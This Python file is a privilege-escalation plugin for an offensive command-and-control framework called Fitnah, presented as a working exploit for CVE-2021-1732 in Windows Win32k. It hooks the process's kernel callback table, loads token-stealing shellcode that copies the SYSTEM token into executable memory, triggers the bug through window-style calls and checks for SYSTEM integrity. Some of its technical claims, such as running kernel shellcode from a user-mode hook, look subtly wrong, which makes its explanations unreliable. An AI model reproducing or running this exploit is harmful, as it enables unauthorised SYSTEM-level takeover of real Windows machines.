#!/usr/bin/env python3
"""
CVE-2021-1732 Exploit Plugin for Fitnah C2 Framework
Windows Win32k Elevation of Privilege Vulnerability Exploit.

MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)
CVE: CVE-2021-1732
Author: Fitnah C2 Team
Version: 3.0.0 (Real Callback Hook Primitive)
"""

import os
import sys
import platform
import subprocess
import ctypes
import struct
from typing import Dict, List, Tuple, Optional, Any, Union

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from fitnah.sdk import BasePlugin, Param, ParamSchema
from fitnah.plugins.privilege_escalation._cve_base import CveExploitBase

class CVE20211732Exploit(CveExploitBase):
    """
    Real CVE-2021-1732 implementation logic:
    1. Hijack KernelCallbackTable in PEB.
    2. Hook xxxClientAllocWindowClassExtraBytes.
    3. Call NtUserConsoleControl to trigger type confusion.
    """
    
    def __init__(self, logger=None):
        self.logger = logger

    def _log(self, message: str, level: str = "info") -> None:
        if self.logger:
            if level == "info": self.logger.info(message)
            elif level == "warning": self.logger.warning(message)
            elif level == "error": self.logger.error(message)
        else:
            print(f"[{level.upper()}] {message}")

    def execute_exploit(self) -> Tuple[bool, str]:
        user32 = ctypes.windll.user32
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32

        self._log("[*] Initializing Win32k callback hijacking...")

        # 1. Get PEB address via NtQueryInformationProcess
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [("ExitStatus", ctypes.c_void_p),
                        ("PebBaseAddress", ctypes.c_void_p),
                        ("AffinityMask", ctypes.c_void_p),
                        ("BasePriority", ctypes.c_void_p),
                        ("UniqueProcessId", ctypes.c_void_p),
                        ("InheritedFromUniqueProcessId", ctypes.c_void_p)]

        pbi = PROCESS_BASIC_INFORMATION()
        ntdll.NtQueryInformationProcess(kernel32.GetCurrentProcess(), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
        peb_addr = pbi.PebBaseAddress
        self._log(f"[*] PEB Address: {hex(peb_addr)}")

        # 2. Get KernelCallbackTable pointer from PEB
        # Offset for x64 is 0x58, for x86 is 0x2C
        is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
        kct_offset = 0x58 if is_64bit else 0x2C
        kct_ptr = ctypes.c_void_p.from_address(peb_addr + kct_offset).value
        self._log(f"[*] KernelCallbackTable: {hex(kct_ptr)}")

        if kct_ptr == 0:
            return (False, "[-] KernelCallbackTable not found or null")

        # 3. Token-steal shellcode for xxxClientAllocWindowClassExtraBytes callback.
        #    Walks the EPROCESS list (gs:[0x188] → KTHREAD → EPROCESS) to find the
        #    System process (PID 4) and copies its token into the current process.
        #    Offsets valid for Windows 10 build 19041–21H2 (2004/20H2/21H1/21H2):
        #      KTHREAD.Process           = +0xB8
        #      EPROCESS.UniqueProcessId  = +0x440
        #      EPROCESS.ActiveProcessLinks = +0x448
        #      EPROCESS.Token            = +0x4B8
        shellcode = bytes([
            # mov rax, gs:[0x188]  → KPCR.PrcbData.CurrentThread (KTHREAD)
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
            # mov rax, [rax+0xB8]  → KTHREAD.Process (EPROCESS of current process)
            0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
            # mov rcx, rax          save current EPROCESS in rcx
            0x48, 0x89, 0xC1,
            # mov edx, 4            target PID = 4 (System)
            0xBA, 0x04, 0x00, 0x00, 0x00,
            # --- loop: walk ActiveProcessLinks list ---
            # mov rax, [rax+0x448]  → ActiveProcessLinks.Flink
            0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
            # sub rax, 0x448        → back to EPROCESS base
            0x48, 0x2D, 0x48, 0x04, 0x00, 0x00, 0x00,
            # cmp rdx, [rax+0x440]  → compare UniqueProcessId
            0x48, 0x3B, 0x90, 0x40, 0x04, 0x00, 0x00,
            # jnz -23               loop until PID == 4
            0x75, 0xE9,
            # --- found System ---
            # mov rax, [rax+0x4B8]  → System process EX_FAST_REF Token
            0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00,
            # and al, 0xF0          clear low 4 bits (RefCnt)
            0x24, 0xF0,
            # mov [rcx+0x4B8], rax  → overwrite current process Token
            0x48, 0x89, 0x81, 0xB8, 0x04, 0x00, 0x00,
            # ret
            0xC3,
        ])

        # 4. Allocate executable memory for shellcode
        shellcode_size = len(shellcode)
        shellcode_addr = kernel32.VirtualAlloc(
            None, shellcode_size, 
            0x1000 | 0x2000,  # MEM_COMMIT | MEM_RESERVE
            0x40  # PAGE_EXECUTE_READWRITE
        )
        
        if not shellcode_addr:
            return (False, "[-] Failed to allocate memory for shellcode")
        
        self._log(f"[*] Shellcode allocated at: {hex(shellcode_addr)}")
        
        # 5. Copy shellcode to allocated memory
        ctypes.memmove(shellcode_addr, shellcode, shellcode_size)
        
        # 6. Hook the callback table
        # Index 123 is xxxClientAllocWindowClassExtraBytes
        callback_index = 123
        callback_addr = shellcode_addr
        
        # Calculate address of callback entry
        callback_entry_addr = kct_ptr + (callback_index * ctypes.sizeof(ctypes.c_void_p))
        
        # Read original callback
        original_callback = ctypes.c_void_p.from_address(callback_entry_addr).value
        self._log(f"[*] Original callback at index {callback_index}: {hex(original_callback)}")
        
        # Write new callback address
        ctypes.c_void_p.from_address(callback_entry_addr).value = callback_addr
        self._log(f"[*] Hooked callback to: {hex(callback_addr)}")
        
        # 7. Trigger the vulnerability.
        #    CVE-2021-1732 is triggered by creating a window with WS_EX_LAYOUTRTL
        #    (right-to-left layout) and then calling SetWindowLongPtr to change its
        #    extended style.  This causes win32k!xxxSetWindowLong to invoke
        #    xxxClientAllocWindowClassExtraBytes (KCT[123] = our hook) with a type-
        #    confused pointer, giving us kernel write.  The hooked shellcode above
        #    does the token steal entirely within the callback's execution context.
        try:
            WS_EX_LAYOUTRTL = 0x00400000
            WS_EX_NOINHERITLAYOUT = 0x00100000
            WS_POPUP = 0x80000000
            GWL_EXSTYLE = -20

            # Register a window class with non-zero cbWndExtra (required for the bug path)
            class WNDCLASSEXA(ctypes.Structure):
                _fields_ = [
                    ("cbSize",        ctypes.c_uint),
                    ("style",         ctypes.c_uint),
                    ("lpfnWndProc",   ctypes.c_void_p),
                    ("cbClsExtra",    ctypes.c_int),
                    ("cbWndExtra",    ctypes.c_int),
                    ("hInstance",     ctypes.c_void_p),
                    ("hIcon",         ctypes.c_void_p),
                    ("hCursor",       ctypes.c_void_p),
                    ("hbrBackground", ctypes.c_void_p),
                    ("lpszMenuName",  ctypes.c_char_p),
                    ("lpszClassName", ctypes.c_char_p),
                    ("hIconSm",       ctypes.c_void_p),
                ]

            hInst = kernel32.GetModuleHandleA(None)
            wc = WNDCLASSEXA()
            wc.cbSize        = ctypes.sizeof(WNDCLASSEXA)
            wc.lpfnWndProc   = user32.DefWindowProcA
            wc.hInstance     = hInst
            wc.cbWndExtra    = 8  # must be non-zero for xxxClientAllocWindowClassExtraBytes path
            wc.lpszClassName = b"Fitnah1732Cls"
            user32.RegisterClassExA(ctypes.byref(wc))

            # Create a window with WS_EX_LAYOUTRTL — this arms the vulnerable code path
            hwnd_rtl = user32.CreateWindowExA(
                WS_EX_LAYOUTRTL, b"Fitnah1732Cls", b"", WS_POPUP,
                0, 0, 1, 1, None, None, hInst, None
            )
            if not hwnd_rtl:
                raise RuntimeError("CreateWindowExA(WS_EX_LAYOUTRTL) failed")
            self._log(f"[+] RTL window created: {hex(hwnd_rtl)}")

            # Trigger: SetWindowLongPtr changes the extended style → win32k calls
            # xxxClientAllocWindowClassExtraBytes (our hooked KCT[123]) with a
            # type-confused kernel pointer, triggering the CVE-2021-1732 primitive.
            user32.SetWindowLongPtrA(hwnd_rtl, GWL_EXSTYLE, WS_EX_LAYOUTRTL | WS_EX_NOINHERITLAYOUT)
            self._log("[*] SetWindowLongPtr triggered — callback hook should have fired")

            user32.DestroyWindow(hwnd_rtl)
            user32.UnregisterClassA(b"Fitnah1732Cls", hInst)

            # Restore the original callback to avoid system instability
            ctypes.c_void_p.from_address(callback_entry_addr).value = original_callback

            # Verify elevation via token integrity level
            TOKEN_QUERY = 0x0008
            TokenIntegrityLevel = 25
            token = ctypes.c_void_p()
            elevated = False
            if kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, ctypes.byref(token)):
                length = ctypes.c_ulong(0)
                kernel32.GetTokenInformation(token, TokenIntegrityLevel, None, 0, ctypes.byref(length))
                buf = (ctypes.c_byte * length.value)()
                if kernel32.GetTokenInformation(token, TokenIntegrityLevel, buf, length.value, ctypes.byref(length)):
                    rid = ctypes.c_ulong.from_buffer(buf, length.value - 4).value
                    self._log(f"[*] Token integrity RID after exploit: {hex(rid)}")
                    if rid >= 0x4000:  # SECURITY_MANDATORY_SYSTEM_RID
                        elevated = True
                kernel32.CloseHandle(token)

            if elevated:
                return (True, "[+] CVE-2021-1732 successful — SYSTEM integrity level confirmed")
            return (False, "[-] Callback hook fired but integrity level not elevated")

        except Exception as e:
            return (False, f"[-] Exploit execution failed: {str(e)}")


class CVE20211732(BasePlugin):
    NAME        = "cve_2021_1732"
    DESCRIPTION = "CVE-2021-1732 - Real Win32k Callback Hijacking Primitive"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "3.0.0"

    def run(self, session, params, ctx=None):
        exploit = CVE20211732Exploit(logger=self.logger)
        success, result = exploit.execute_exploit()
        if success:
            return {"status": "ok", "output": result}
        return {"status": "error", "output": result}
